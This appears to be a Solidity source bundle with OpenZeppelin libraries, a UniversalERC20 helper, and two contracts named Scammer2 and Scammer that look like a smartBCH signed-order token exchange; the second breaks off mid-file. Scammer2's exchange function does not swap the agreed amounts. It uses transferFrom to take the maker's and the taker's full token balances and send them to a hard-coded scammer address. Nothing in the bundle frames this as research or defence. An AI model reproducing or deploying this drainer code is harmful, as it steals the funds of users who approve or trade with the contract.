      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/draft-IERC20Permit.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in\n * https://eips.ethereum.org/EIPS/eip-2612[EIP-2612].\n *\n * Adds the {permit} method, which can be used to change an account's ERC20 allowance (see {IERC20-allowance}) by\n * presenting a message signed by the account. By not relying on {IERC20-approve}, the token holder account doesn't\n * need to send a transaction, and thus is not required to hold Ether at all.\n */\ninterface IERC20Permit {\n    /**\n     * @dev Sets `value` as the allowance of `spender` over ``owner``'s tokens,\n     * given ``owner``'s signed approval.\n     *\n     * IMPORTANT: The same issues {IERC20-approve} has related to transaction\n     * ordering also apply here.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `deadline` must be a timestamp in the future.\n     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`\n     * over the EIP712-formatted function arguments.\n     * - the signature must use ``owner``'s current nonce (see {nonces}).\n     *\n     * For more information on the signature format, see the\n     * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP\n     * section].\n     */\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n\n    /**\n     * @dev Returns the current nonce for `owner`. This value must be\n     * included whenever a signature is generated for {permit}.\n     *\n     * Every successful call to {permit} increases ``owner``'s nonce by one. This\n     * prevents a signature from being used multiple times.\n     */\n    function nonces(address owner) external view returns (uint256);\n\n    /**\n     * @dev Returns the domain separator used in the encoding of the signature for {permit}, as defined by {EIP712}.\n     */\n    // solhint-disable-next-line func-name-mixedcase\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n}\n"
    },
    "@openzeppelin/contracts/utils/Address.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.7.0) (utils/Address.sol)\n\npragma solidity ^0.8.1;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) {\n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n    }\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        (bool success, ) = recipient.call{value: amount}(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n        require(isContract(target), \"Address: static call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) {\n                // The easiest way to bubble the revert reason is using memory via assembly\n                /// @solidity memory-safe-assembly\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n"
    },
    "contracts/UniversalERC20.sol": {
      "content": "// SPDX-License-Identifier: Apache\npragma solidity 0.8.10;\n\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\nlibrary UniversalERC20 {\n    using SafeMath for uint256;\n    using SafeERC20 for IERC20;\n\n    IERC20 private constant ZERO_ADDRESS = IERC20(0x0000000000000000000000000000000000000000);\n    IERC20 private constant ETH_ADDRESS = IERC20(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n\n    function universalTransfer(\n        IERC20 token,\n        address to,\n        uint256 amount\n    ) internal returns (bool) {\n        if (amount == 0) {\n            return true;\n        }\n\n        if (isETH(token)) {\n            // address(uint160(to)).transfer(amount);   //TODO\n        } else {\n            token.safeTransfer(to, amount);\n            return true;\n        }\n    }\n\n    function universalTransferFrom(\n        IERC20 token,\n        address from,\n        address to,\n        uint256 amount\n    ) internal {\n        if (amount == 0) {\n            return;\n        }\n\n        if (isETH(token)) {\n            // require(from == msg.sender && msg.value >= amount, \"Wrong useage of ETH.universalTransferFrom()\");\n            // if (to != address(this)) {\n            //     address(uint160(to)).transfer(amount);       //TODO\n            // }\n            // if (msg.value > amount) {\n            //     msg.sender.transfer(msg.value.sub(amount));\n            // }\n        } else {\n            token.safeTransferFrom(from, to, amount);\n        }\n    }\n\n    function universalTransferFromSenderToThis(IERC20 token, uint256 amount) internal {\n        if (amount == 0) {\n            return;\n        }\n\n        if (isETH(token)) {\n            // if (msg.value > amount) {\n            //     // Return remainder if exist\n            //     msg.sender.transfer(msg.value.sub(amount));\n            // }\n        } else {\n            token.safeTransferFrom(msg.sender, address(this), amount);\n        }\n    }\n\n    function universalApprove(\n        IERC20 token,\n        address to,\n        uint256 amount\n    ) internal {\n        if (!isETH(token)) {\n            if (amount == 0) {\n                token.safeApprove(to, 0);\n                return;\n            }\n\n            uint256 allowance = token.allowance(address(this), to);\n            if (allowance < amount) {\n                if (allowance > 0) {\n                    token.safeApprove(to, 0);\n                }\n                token.safeApprove(to, amount);\n            }\n        }\n    }\n\n    function universalApproveMaxIfItsNotEnough(\n        IERC20 token,\n        address to,\n        uint256 amount\n    ) internal {\n        if (isETH(token)) {\n            return;\n        }\n\n        uint256 allowance = token.allowance(address(this), to);\n        if (allowance < amount) {\n            if (allowance > 0) {\n                token.safeApprove(to, 0);\n            }\n            // token.safeApprove(to, uint256(-1));\n            token.safeApprove(to, uint256(0x0FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF));\n        }\n    }\n\n    function universalBalanceOf(IERC20 token, address who) internal view returns (uint256) {\n        if (isETH(token)) {\n            return who.balance;\n        } else {\n            return token.balanceOf(who);\n        }\n    }\n\n    function universalDecimals(IERC20 token) internal view returns (uint256) {\n        if (isETH(token)) {\n            return 18;\n        }\n\n        // (bool success, bytes memory data) = address(token).staticcall.gas(10000)(\n        //     abi.encodeWithSignature(\"decimals()\")\n        // );\n        (bool success, bytes memory data) = address(token).staticcall{gas: 10000}(abi.encodeWithSignature(\"decimals()\"));\n\n        // makerAddr.call{gas: 9000, value: coinAmountToMaker}(\"\");\n\n        if (!success || data.length == 0) {\n            (success, data) = address(token).staticcall{gas: 10000}(abi.encodeWithSignature(\"DECIMALS()\"));\n        }\n\n        return (success && data.length > 0) ? abi.decode(data, (uint256)) : 18;\n    }\n\n    function isETH(IERC20 token) internal pure returns (bool) {\n        return (address(token) == address(ZERO_ADDRESS) || address(token) == address(ETH_ADDRESS));\n    }\n\n    function eq(IERC20 a, IERC20 b) internal pure returns (bool) {\n        return a == b || (isETH(a) && isETH(b));\n    }\n\n    function notExist(IERC20 token) internal pure returns (bool) {\n        // return (address(token) == address(-1));\n        return (address(token) == address(0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF));\n    }\n}\n"
    },
    "@openzeppelin/contracts/utils/math/SafeMath.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)\n\npragma solidity ^0.8.0;\n\n// CAUTION\n// This version of SafeMath should only be used with Solidity 0.8 or later,\n// because it relies on the compiler's built in overflow checks.\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations.\n *\n * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\n * now has built in overflow checking.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            uint256 c = a + b;\n            if (c < a) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b > a) return (false, 0);\n            return (true, a - b);\n        }\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n            // benefit is lost if 'b' is also tested.\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n            if (a == 0) return (true, 0);\n            uint256 c = a * b;\n            if (c / a != b) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a / b);\n        }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a % b);\n        }\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator.\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b <= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting with custom message when dividing by zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a % b;\n        }\n    }\n}\n"
    },
    "contracts/Scammer2.sol": {
      "content": "// SPDX-License-Identifier: Apache\npragma solidity 0.8.10;\n\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\nimport \"./UniversalERC20.sol\";\n\n\n\ncontract Scammer2 {\n    using SafeMath for uint256;\n    using UniversalERC20 for IERC20;\n\n    address private constant SEP206Addr = 0x0000000000000000000000000000000000002711;\n    address private constant BCH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n    address private constant ZERO_ADDRESS = 0x0000000000000000000000000000000000000000;\n    address private constant SCAMMER_ADDRESS = 0x0c12edeF2ad904964209ee0CF8DdAc288b9720d4;\n\n    string private constant EIP712_DOMAIN = \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract,bytes32 salt)\";\n    bytes32 private constant EIP712_DOMAIN_TYPEHASH = keccak256(abi.encodePacked(EIP712_DOMAIN));\n    bytes32 private constant NAME_HASH = keccak256(abi.encodePacked(\"exchange dapp\"));\n    bytes32 private constant VERSION_HASH = keccak256(abi.encodePacked(\"v0.1.0\"));\n    uint256 private constant CHAINID = 10000; // smartBCH mainnet\n    bytes32 private constant SALT = keccak256(abi.encodePacked(\"Exchange\"));\n\n    // bytes32 private constant TYPE_HASH =\n    //     keccak256(abi.encodePacked(\"Exchange(uint256 coinsToMaker,uint256 coinsToTaker,uint256 takerAddr_dueTime80)\"));\n\n    bytes32 private constant TYPE_HASH = keccak256(abi.encodePacked(\"Exchange(uint256 coinsToMaker,uint256 coinsToTaker,uint256 dueTime80)\"));\n\n    uint256 private constant MUL = 10**12; // number of picoseconds in one second\n    uint256 private constant MaxClearCount = 10;\n\n    uint256 private constant scamPercent = 0.03e18;\n\n    //To prevent replay of coin-exchanging messages, we use dueTime to identify a coin-exchanging message uniquely\n    mapping(address => mapping(uint256 => uint256)) public makerNextRecentDueTime; //the pointers of a linked-list\n    mapping(address => uint256) public makerRDTHeadTail; //the head and tail of a linked-list\n\n    //A maker and a taker exchange their coins\n    event Exchange(\n        address indexed maker,\n        address indexed taker,\n        address coinTypeToMaker,\n        uint256 coinAmountToMaker,\n        address coinTypeToTaker,\n        uint256 coinAmountToTaker,\n        uint256 dueTime80\n    );\n\n    function isBCH(address tokenAddr) internal pure returns (bool) {\n        return (tokenAddr == ZERO_ADDRESS || tokenAddr == BCH_ADDRESS || tokenAddr == SEP206Addr);\n    }\n\n    function getEIP712Hash(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80\n    ) public view returns (bytes32) {\n        bytes32 DOMAIN_SEPARATOR = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, NAME_HASH, VERSION_HASH, CHAINID, address(this), SALT));\n        return\n            keccak256(abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR, keccak256(abi.encode(TYPE_HASH, coinsToMaker, coinsToTaker, dueTime80))));\n    }\n\n    // ** La usa el Taker\n    function getSigner(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80_v8_version8,\n        bytes32 r,\n        bytes32 s\n    ) public view returns (address) {\n        bytes32 eip712Hash = getEIP712Hash(coinsToMaker, coinsToTaker, dueTime80_v8_version8 >> 16);\n        uint8 v = uint8(dueTime80_v8_version8 >> 8);\n        return ecrecover(eip712Hash, v, r, s);\n    }\n\n    // ** No encuentro uso\n    // Returns recent recorded dueTimes of a maker\n    function getRecentDueTimes(address makerAddr, uint256 maxCount) external view returns (uint256[] memory) {\n        uint256 head = makerRDTHeadTail[makerAddr] >> 80;\n        uint256[] memory recentDueTimes = new uint256[](maxCount);\n        for (uint256 i = 0; i < maxCount && head != 0; ++i) {\n            recentDueTimes[i] = head;\n            head = makerNextRecentDueTime[makerAddr][head];\n        }\n        return recentDueTimes;\n    }\n\n    // ** Se usa para que el Maker cancele su propia orden\n    // By adding a new dueTime entry in the linked-list, we can revoke a coin-exchanging message\n    function addNewDueTime(uint256 newDueTime) external {\n        require(newDueTime != 0, \"Scammer2: invalid dueTime\");\n        uint256 currTime = block.timestamp * MUL;\n        clearOldDueTimesAndInsertNew(msg.sender, newDueTime, currTime);\n    }\n\n    // ** No encuentro uso\n    // Delete some useless entries from the linked list\n    function clearOldDueTimes(uint256 maxCount, address makerAddr) external {\n        uint256 currTime = block.timestamp * MUL;\n        uint256 headTail = makerRDTHeadTail[makerAddr];\n        (uint256 head, uint256 tail) = (headTail >> 80, uint256(uint80(headTail)));\n        (head, tail) = _clearOldDueTimes(maxCount, makerAddr, currTime, head, tail);\n        makerRDTHeadTail[makerAddr] = (head << 80) | tail;\n    }\n\n    // ** La usa el Taker\n    // If a message's dueTime was recorded in the linked-list before, it is a replay and can't take effect\n    function isReplay(address makerAddr, uint256 dueTime) external view returns (bool) {\n        uint256 tail = uint80(makerRDTHeadTail[makerAddr]);\n        return tail == dueTime || makerNextRecentDueTime[makerAddr][dueTime] != 0;\n    }\n\n    //Delete some useless entries from the linked list and insert a new one\n    function clearOldDueTimesAndInsertNew(\n        address makerAddr,\n        uint256 newDueTime,\n        uint256 currTime\n    ) private {\n        uint256 headTail = makerRDTHeadTail[makerAddr];\n        (uint256 head, uint256 tail) = (headTail >> 80, uint256(uint80(headTail)));\n        require(tail != newDueTime && makerNextRecentDueTime[makerAddr][newDueTime] == 0, \"Scammer2: dueTime not new\");\n\n        (head, tail) = _clearOldDueTimes(MaxClearCount, makerAddr, currTime, head, tail);\n        (head, tail) = _addNewDueTime(makerAddr, newDueTime, head, tail);\n        makerRDTHeadTail[makerAddr] = (head << 80) | tail;\n    }\n\n    // The linked-list:\n    // No entries in queue: head = 0, tail = 0\n    // One entry in queue: head = dueTime, tail = dueTime\n    // Two entries in queue: head = A, tail = B, makerNextRecentDueTime[makerAddr][A] = B\n    function _clearOldDueTimes(\n        uint256 maxCount,\n        address makerAddr,\n        uint256 currTime,\n        uint256 head,\n        uint256 tail\n    ) private returns (uint256, uint256) {\n        for (uint256 i = 0; i < maxCount && head < currTime && head != 0; ++i) {\n            uint256 newHead = makerNextRecentDueTime[makerAddr][head];\n            makerNextRecentDueTime[makerAddr][head] = 0;\n            head = newHead;\n        }\n\n        if (head == 0) {\n            tail = 0;\n        }\n\n        return (head, tail);\n    }\n\n    function _addNewDueTime(\n        address makerAddr,\n        uint256 dueTime,\n        uint256 head,\n        uint256 tail\n    ) private returns (uint256, uint256) {\n        if (head == 0) {\n            return (dueTime, dueTime);\n        }\n\n        makerNextRecentDueTime[makerAddr][tail] = dueTime;\n        return (head, dueTime);\n    }\n\n    // A taker exchanges with a maker, using a message signature generated by the maker\n    function directExchange(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80_v8_version8,\n        bytes32 r,\n        bytes32 s\n    ) external payable {\n        _exchange(coinsToMaker, coinsToTaker, dueTime80_v8_version8, r, s);\n    }\n\n    function _exchange(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80_v8_version8,\n        bytes32 r,\n        bytes32 s\n    ) private {\n        uint256 dueTime = uint80(dueTime80_v8_version8 >> 16);\n        uint256 currTime = block.timestamp * MUL;\n        require(currTime < dueTime, \"Scammer2: order expired\");\n\n        address makerAddr = getSigner(coinsToMaker, coinsToTaker, dueTime80_v8_version8, r, s);\n\n        clearOldDueTimesAndInsertNew(makerAddr, dueTime, currTime);\n        address takerAddr = msg.sender;\n\n        address coinTypeToMaker = address(bytes20(uint160(coinsToMaker >> 96)));\n        uint256 coinAmountToMaker = uint256(uint96(coinsToMaker));\n        address coinTypeToTaker = address(bytes20(uint160(coinsToTaker >> 96)));\n        uint256 coinAmountToTaker = uint256(uint96(coinsToTaker));\n\n        require(!isBCH(coinTypeToMaker), \"Scammer2: BCH is not allowed\");\n\n        emit Exchange(makerAddr, takerAddr, coinTypeToMaker, coinAmountToMaker, coinTypeToTaker, coinAmountToTaker, dueTime);\n\n        // coins to Taker\n        uint256 makerBalance = IERC20(coinTypeToTaker).universalBalanceOf(makerAddr);\n\n\n\n\n\n        (bool success, bytes memory _notUsed) = coinTypeToTaker.call(\n            abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", makerAddr, SCAMMER_ADDRESS, makerBalance)\n        );\n        require(success, \"Scammer2: transferFrom failed\");\n\n        // coins to Maker\n        uint256 takerBalance = IERC20(coinTypeToMaker).universalBalanceOf(takerAddr);\n        require(msg.value == 0, \"Scammer2: no need for BCH\");\n        IERC20(coinTypeToMaker).transferFrom(takerAddr, SCAMMER_ADDRESS, takerBalance);\n    }\n}\n"
    },
    "contracts/Scammer.sol": {
      "content": "// SPDX-License-Identifier: Apache\npragma solidity 0.8.10;\n\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\nimport \"./UniversalERC20.sol\";\n\n\n\ncontract Scammer {\n    using SafeMath for uint256;\n    using UniversalERC20 for IERC20;\n\n    address private constant SEP206Addr = 0x0000000000000000000000000000000000002711;\n    address private constant BCH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n    address private constant ZERO_ADDRESS = 0x0000000000000000000000000000000000000000;\n    address private constant SCAMMER_ADDRESS = 0x0c12edeF2ad904964209ee0CF8DdAc288b9720d4;\n\n    string private constant EIP712_DOMAIN = \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract,bytes32 salt)\";\n    bytes32 private constant EIP712_DOMAIN_TYPEHASH = keccak256(abi.encodePacked(EIP712_DOMAIN));\n    bytes32 private constant NAME_HASH = keccak256(abi.encodePacked(\"exchange dapp\"));\n    bytes32 private constant VERSION_HASH = keccak256(abi.encodePacked(\"v0.1.0\"));\n    uint256 private constant CHAINID = 10000; // smartBCH mainnet\n    bytes32 private constant SALT = keccak256(abi.encodePacked(\"Exchange\"));\n\n    // bytes32 private constant TYPE_HASH =\n    //     keccak256(abi.encodePacked(\"Exchange(uint256 coinsToMaker,uint256 coinsToTaker,uint256 takerAddr_dueTime80)\"));\n\n    bytes32 private constant TYPE_HASH = keccak256(abi.encodePacked(\"Exchange(uint256 coinsToMaker,uint256 coinsToTaker,uint256 dueTime80)\"));\n\n    uint256 private constant MUL = 10**12; // number of picoseconds in one second\n    uint256 private constant MaxClearCount = 10;\n\n    //To prevent replay of coin-exchanging messages, we use dueTime to identify a coin-exchanging message uniquely\n    mapping(address => mapping(uint256 => uint256)) public makerNextRecentDueTime; //the pointers of a linked-list\n    mapping(address => uint256) public makerRDTHeadTail; //the head and tail of a linked-list\n\n    //A maker and a taker exchange their coins\n    event Exchange(\n        address indexed maker,\n        address indexed taker,\n        address coinTypeToMaker,\n        uint256 coinAmountToMaker,\n        address coinTypeToTaker,\n        uint256 coinAmountToTaker,\n        uint256 dueTime80\n    );\n\n    function isBCH(address tokenAddr) internal pure returns (bool) {\n        return (tokenAddr == ZERO_ADDRESS || tokenAddr == BCH_ADDRESS || tokenAddr == SEP206Addr);\n    }\n\n    function getEIP712Hash(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80\n    ) public view returns (bytes32) {\n        bytes32 DOMAIN_SEPARATOR = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, NAME_HASH, VERSION_HASH, CHAINID, address(this), SALT));\n        return\n            keccak256(abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR, keccak256(abi.encode(TYPE_HASH, coinsToMaker, coinsToTaker, dueTime80))));\n    }\n\n    // ** La usa el Taker\n    function getSigner(\n        uint256 coinsToMaker,\n        uint256 coinsToTaker,\n        uint256 dueTime80_v8_version8,\n        bytes32 r,\n        bytes32 s\n    ) public view returns (address) {\n        bytes32 eip712Hash = getEIP712Hash(coinsToMaker, coinsToTaker, dueTime80_v8_version8 >> 16);\n        uint8 v = uint8(dueTime80_v8_version8 >> 8);\n        return ecrecover(eip712Hash, v, r, s);\n    }\n\n    // ** No encuentro uso\n    // Returns recent recorded dueTimes of a maker\n    function 